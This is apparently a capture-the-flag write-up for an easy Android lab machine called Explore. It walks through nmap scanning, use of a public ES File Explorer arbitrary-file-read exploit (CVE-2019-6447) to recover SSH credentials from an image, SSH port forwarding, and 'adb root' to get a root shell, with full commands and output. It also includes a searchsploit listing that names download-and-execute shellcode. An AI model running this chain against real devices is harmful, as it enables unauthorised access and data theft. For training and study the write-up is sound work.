# Explore
```
Difficulty: Easy
Operating System: Android
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan & OSINT | Identified a running **Android** device with ports 2222 (SSH), 5555 (filtered), and high-numbered ports 42135 and 59777 open, pointing to **ES File Explorer**. |
| 2 | (Local) | Exploitation of ES File Explorer Vulnerability (CVE-2019-6447) | Used a public exploit to achieve arbitrary file read on the device. Discovered and downloaded a `creds.jpg` file which contained SSH credentials for the user `kristi`. |
| 3 | kristi | SSH Login | Used the stolen credentials (`kristi:Kr1sT!5h@Rp3xPl0r3!`) to log in via SSH on port 2222. |
| 4 | kristi | Port Forwarding & Service Enumeration | Found the filtered port 5555 was listening on the local interface (127.0.0.1). Used SSH local port forwarding to access the service from the attacker machine. |
| 5 | root | ADB Privileged Access | The service on port 5555 was identified as **Android Debug Bridge (ADB)**. Used the `adb root` command to restart the daemon with root privileges, gaining a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.10.247
Host is up (0.050s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn\'t have a title (text/html).
45097/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 28 Jun 2022 13:38:16 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 28 Jun 2022 13:38:16 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 28 Jun 2022 13:38:21 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 28 Jun 2022 13:38:36 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 28 Jun 2022 13:38:21 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 28 Jun 2022 13:38:36 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???\`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 28 Jun 2022 13:38:36 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 28 Jun 2022 13:38:36 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn\'t have a title (text/plain).
```  
As we can notice this machine is exposing a strange SSH banner `SSH-2.0-SSH Server - Banana Studio` poking around on google we can notice that this ssh server si used by android devices. So we can assume this machine is an Android device.  
Googling for other higher open ports, we can see that those are related to 'ES File Explorer'.  
If we do a searchsploit for ES File Explorer, we cann see the following:  
```bash
Linux/x86 - Find All Writeable Folder In FileSystem + Polymorphic Shellcode (91 bytes)                                                                                                                     | linux_x86/14276.c
Linux/x86 - OpenSSL Encrypt (aes256cbc) Files (test.txt) Shellcode (185 bytes)                                                                                                                             | linux_x86/46791.c
Linux/x86 - Read /etc/passwd file + Null-Free Shellcode (51 bytes)                                                                                                                                         | linux_x86/43736.c
Linux/x86 - Read File (/etc/passwd) + MSF Optimized Shellcode (61 bytes)                                                                                                                                   | linux_x86/45416.c
Linux/x86 - Reverse (140.115.53.35:9999/TCP) + Download File (cb) + Execute Shellcode (149 bytes)                                                                                                          | linux_x86/13337.c
Linux/x86 - Reverse PHP (Writes To /var/www/cb.php On The Filesystem) Shell Shellcode (508 bytes)                                                                                                          | linux_x86/13340.c
Linux/x86 - Search For '.PHP'/'.HTML' Writable Files + Add Code Shellcode (380+ bytes)                                                                                                                     | linux_x86/18379.c
Linux/x86 - Shred File (test.txt) Shellcode (72 bytes)                                                                                                                                                     | linux_x86/46801.txt
Solaris/MIPS - Download File (http://10.1.1.2:80/evil-dl) + Execute (/tmp/ff) Shellcode (278 bytes)                                                                                                        | solaris_mips/13489.c
Solaris/x86 - Download File (http://shell-storm.org/exemple-solaris) Shellcode (79 bytes)                                                                                                                  | solaris_x86/13711.c
Windows (2000/XP/7) - URLDownloadToFile(http://bflow.security-portal.cz/down/xy.txt) + WinExec() + ExitProcess Shellcode                                                                                   | windows/24318.c
Windows - Download File + Execute Via DNS + IPv6 Shellcode (Generator) (Metasploit)                                                                                                                        | generator/17326.rb
Windows - Keylogger To File (./log.bin) + Null-Free Shellcode (431 bytes)                                                                                                                                  | windows/39731.c
Windows - Keylogger To File (%TEMP%/log.bin) + Null-Free Shellcode (601 bytes)                                                                                                                             | windows/39794.c
Windows/x64 - Download File (http://192.168.10.129/pl.exe) + Execute (C:/Users/Public/p.exe) Shellcode (358 bytes)                                                                                         | windows_x86-64/40821.c
Windows/x64 - URLDownloadToFileA(http://localhost/trojan.exe) + Execute Shellcode (218+ bytes)                                                                                                             | windows_x86-64/13533.asm
Windows/x64 (XP) - Download File + Execute Shellcode Using PowerShell (Generator)                                                                                                                          | generator/36411.py
Windows/x86 - Download File (//192.168.1.19/c) Via WebDAV + Execute Null-Free Shellcode (96 bytes)                                                                                                         | windows_x86/39519.c
Windows/x86 - Download File and Execute / Dynamic PEB & EDT method Shellcode (458 bytes)                                                                                                                   | windows_x86/50710.asm
Windows/x86 - Download File + Execute Shellcode (192 bytes)                                                                                                                                                | windows_x86/13516.asm
Windows/x86 - Download File + Execute Shellcode (Browsers Edition) (275+ bytes) (Generator)                                                                                                                | generator/13515.pl
Windows/x86 - Download File (http://10.10.10.5:8080/2NWyfQ9T.hta) Via mshta + Execute + Stager Shellcode (143 bytes)                                                                                       | windows_x86/49466.asm
Windows/x86 - Download File (http://127.0.0.1/file.exe) + Execute Shellcode (124 bytes)                                                                                                                    | windows_x86/13517.asm
Windows/x86 - Download File (http://192.168.0.13/ms.msi) Via msiexec + Execute Shellcode (95 bytes)                                                                                                        | windows_x86/46281.c
Windows/x86 - Download File (http://192.168.10.10/evil.exe _c:\evil.exe_) Via bitsadmin + Execute Shellcode (210 Bytes)                                                                                   | windows_x86/47041.c
Windows/x86 - Download File (http://192.168.43.192:8080/9MKWaRO.hta) Via mshta Shellcode (100 bytes)                                                                                                       | windows_x86/48718.c
Windows/x86 - Download File (http://skypher.com/dll) + LoadLibrary + Null-Free Shellcode (164 bytes)                                                                                                       | windows_x86/43766.asm
Windows/x86 - Download File (http://www.ph4nt0m.org/a.exe) + Execute (C:/a.exe) Shellcode (226+ bytes)                                                                                                     | windows_x86/13522.c
Windows/x86 - Reverse (/TCP) + Download File + Save + Execute Shellcode                                                                                                                                    | windows_x86/13514.asm
Windows/x86 - URLDownloadToFileA(http://192.168.86.130/sample.exe) + SetFileAttributesA(pyld.exe) + WinExec() + ExitProcess() Shellcode (394 bytes)                                                        | windows_x86/40094.c
Windows/x86 - Write-to-file ('pwned' ./f.txt) + Null-Free Shellcode (278 bytes)                                                                                                                            | windows_x86/14288.asm
Windows/x86 (XP Pro SP3) - Download File Via TFTP + Execute Shellcode (51-60 bytes) (Generator)                                                                                                            | generator/46123.py
Windows/x86 (XP SP3) - Create (file.txt) Shellcode (83 bytes)                                                                                                                                              | windows_x86/36779.c
Windows (XP < 10) - Download File + Execute Shellcode                                                                                                                                                      | windows/39979.c
Windows (XP/2000/2003) - Download File (http://127.0.0.1/test.exe) + Execute (%systemdir%/a.exe) Shellcode (241 bytes)                                                                                     | windows_x86/13529.c
Windows (XP) - Download File (http://www.elitehaven.net/ncat.exe) + Execute (nc.exe) + Null-Free Shellcode                                                                                                 | windows_x86/13530.asm
Windows (XP SP2) (French) - Download File (http://www.site.com/nc.exe) + Execute (c:\backdor.exe) Shellcode                                                                                               | windows_x86/13699.txt
Windows (XP SP3) (Spanish) - URLDownloadToFileA() + CreateProcessA() + ExitProcess() Shellcode (176+ bytes) (Generator)                                                                                    | generator/14014.pl
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
[root@kali Explore ]$ searchsploit es file explorer
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                                                                                                                                                           | android/remote/50070.py
iOS iFileExplorer Free - Directory Traversal                                                                                                                                                               | ios/remote/16278.py
MetaProducts Offline Explorer 1.x - FileSystem Disclosure                                                                                                                                                  | windows/remote/20488.txt
Microsoft Internet Explorer 4/5 - DHTML Edit ActiveX Control File Stealing / Cross Frame Access                                                                                                            | windows/remote/19094.txt
Microsoft Internet Explorer 4.x/5 / Outlook 2000 0/98 0/Express 4.x - ActiveX '.CAB' File Execution                                                                                                        | windows/remote/19603.txt
Microsoft Internet Explorer 5/6 - 'file://' Request Zone Bypass                                                                                                                                            | windows/remote/22575.txt
Microsoft Internet Explorer 5 - ActiveX Object For Constructing Type Libraries For Scriptlets File Write                                                                                                   | windows/remote/19468.txt
Microsoft Internet Explorer 5 / Firefox 0.8 / OmniWeb 4.x - URI Protocol Handler Arbitrary File Creation/Modification                                                                                      | windows/remote/24116.txt
Microsoft Internet Explorer 6 - Local File Access                                                                                                                                                          | windows/remote/29619.html
Microsoft Internet Explorer 6 - '%USERPROFILE%' File Execution                                                                                                                                             | windows/remote/22734.html
Microsoft Internet Explorer 7 - Arbitrary File Rewrite (MS07-027)                                                                                                                                          | windows/remote/3892.html
Microsoft Internet Explorer / MSN - ICC Profiles Crash (PoC)                                                                                                                                               | windows/dos/1110.txt
My File Explorer 1.3.1 iOS - Multiple Web Vulnerabilities                                                                                                                                                  | ios/webapps/28975.txt
WebFileExplorer 3.6 - 'user' / 'pass' SQL Injection                                                                                                                                                        | php/webapps/35851.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
[root@kali Explore ]$ 
```
`ES File Explorer 4.1.9.7.4 - Arbitrary File Read` seems a good candidate, let's test it and see if we can gain any additional information related to this system.  

## User
Now we can test `50070.py` and acknowledge that this exploit works.  
Poking around on system files we can notice a `creds.png` file listed using `listPics` option for the exploit:  
```bash
[root@kali exploits ]$ python3 50070.py listPics $TARGET     

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```
Now we can download this file and see what we have:  
```bash
[root@kali exploits ]$ python3 50070.py getFile $TARGET /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
[root@kali exploits ]$ ls
50070.py  out.dat
```
Now we can rename `out.dat` and see the image content odf the file.  
As we can notice, the file contains credentials `kristi:Kr1sT!5h@Rp3xPl0r3!`, now we can try to use this credentials against the SSH service:  
```bash
[root@kali Explore ]$ ssh -o HostKeyAlgorithms=+ssh-rsa -l kristi $TARGET -p 2222
Password authentication
(kristi@10.10.10.247) Password: 
:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
```
and gain access as user `kristi`

## Root
Once we log in, we can look for processes listening on localhost:  
```bash
127|:/ $ ss -lnpt
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN      0      8       [::ffff:127.0.0.1]:46407                    *:*                  
LISTEN      0      50           *:2222                     *:*                   users:(("ss",pid=9268,fd=70),("sh",pid=5942,fd=70),("sh",pid=5797,fd=70),("droid.sshserver",pid=3271,fd=70))
LISTEN      0      4            *:5555                     *:*                  
LISTEN      0      10           *:42135                    *:*                  
LISTEN      0      50           *:59777                    *:*                  
LISTEN      0      50       [::ffff:10.10.10.247]:37059                    *:*     
```
as we can see we have a process listening on port 5555. The same was discovered during the initial enumeration but we couldn't access the port because it was filtered.  
Now that we have access we can forward this port typing `~C` and entering ssh shell and forward port 5555 to our local client and see what we have:
```bash
127|:/ $ 
ssh> -L 5555:127.0.0.1:5555
Forwarding port.
```
Now we can see that we have a process listening on port 5555:
```bash
[root@kali Explore ]$ netstat -anp | grep 5555
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      3741/ssh            
tcp6       0      0 ::1:5555                :::*                    LISTEN      3741/ssh      
```
Running nmap against localhost:5555 does not allow us to gain knowledge about the service:
```bash
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000053s latency).

PORT     STATE SERVICE  VERSION
5555/tcp open  freeciv?
| fingerprint-strings: 
|   adbConnect: 
|     CNXN
|_    device::ro.product.name=android_x86_64;ro.product.model=VMware Virtual Platform;ro.product.device=x86_64;features=cmd,stat_v2,shell_v2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5555-TCP:V=7.92%I=7%D=6/29%Time=62BC4864%P=x86_64-pc-linux-gnu%r(ad
SF:bConnect,9E,"CNXN\x01\0\0\x01\0\x10\0\0\x86\0\0\0\x8e1\0\0\xbc\xb1\xa7\
SF:xb1device::ro\.product\.name=android_x86_64;ro\.product\.model=VMware\x
SF:20Virtual\x20Platform;ro\.product\.device=x86_64;features=cmd,stat_v2,s
SF:hell_v2");
```
So we can take a shortcut and search on google.  
In the first results we can came across [book.hacktricks.xyz for adb](https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge). 
As reported in the source: Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as installing and debugging apps, and it provides access to a Unix shell that you can use to run a variety of commands on a device.  
Now, following this documentation we can run the following commands:  
```bash
[root@kali ~ ]$ adb connect localhost      
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555
[root@kali ~ ]$ adb root             
adb: unable to connect for root: more than one device/emulator
[root@kali ~ ]$ adb devices                             
List of devices attached
emulator-5554   device
localhost:5555  device
[root@kali ~ ]$ adb -s emulator-5554 root                                                    
restarting adbd as root
x86_64:/ # id            
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0
x86_64:/ # 
```
And gain a shell as root
